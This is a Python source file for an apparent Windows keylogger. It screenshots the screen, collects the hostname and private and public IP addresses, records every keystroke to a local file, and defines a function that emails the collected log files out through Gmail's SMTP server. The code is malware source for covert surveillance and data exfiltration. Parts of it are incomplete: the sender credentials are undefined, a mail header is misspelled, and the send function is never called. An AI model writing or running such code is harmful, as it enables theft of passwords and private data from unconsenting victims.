from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

import socket
import platform

import win32clipboard

from pynput.keyboard import Key, Listener

import time
import os

from cryptography.fernet import Fernet

from scipy.io.wavfile import write
import sounddevice as sd

import getpass
from requests import get

from multiprocessing import Process, freeze_support
from PIL import ImageGrab

keys_information = "key_log.txt"
system_information= "systeminfo.txt"
screenshot_information= "screenshots.png"
system_information = "syseminfo.txt"
clipboard_information = "clipboard.txt"
screenshot_information = "screenshot.png"


file_path = os.getcwd()
extend="\\"

def screenshot():
    im = ImageGrab.grab()
    im.save(file_path+extend+screenshot_information )
screenshot()

def computer_information():
    with open(file_path+extend+system_information,"a") as f:
        hostname = socket.gethostname()
        IPaddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address: " + public_ip + '\n')
        except Exception:
            f.write("Couldn't get Public IP Address (most likely max query)")

        f.write("Processor: " + (platform.processor()) + '\n')
        f.write("System: " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + '\n')
        f.write("Hostname: " + hostname + "\n")
        f.write("Private IP Address: " + IPaddr + "\n")
computer_information()
 

count = 0
keys=[]
def on_press(key):
    global keys,count
    print(key)
    keys.append(key)
    count += 1

    if count >= 1:
        count = 0
        write_file(keys)
        keys =[]

def write_file(keys):
    with open(file_path+extend+keys_information,"a") as f:
        for key in keys:
            k=str(key).replace("'","")
            if k.find("space")>0:
                f.write('\n')
                f.close()
            elif k.find("Key") == -1:
                f.write(k)
                f.close()

def on_release(key):
    if key==Key.esc:
        return False
    
with Listener(on_press=on_press,on_release=on_release) as listener:
    listener.join()

def send_email(filename, attachment, toaddr):

    fromaddr = email_address
    msg = MIMEMultipart()
    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg['Subject'] = "Log file"
    body = "Body_of_the_mail"
    msg.attach(MIMEText(body, 'plain'))
    filename = filename
    attachment = open(attachment, 'rb')
    p = MIMEBase('application', 'octet-stream')
    p.set_payload(attachment.read())
    encoders.encode_base64(p)
    p.add_header('Content-Deposition', "attachment; filename= %s" %filename)
    msg.attach(p)
    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    s.login(fromaddr,password)
    text = msg.as_string()
    s.sendmail(fromaddr, toaddr, text)
    s.quit()
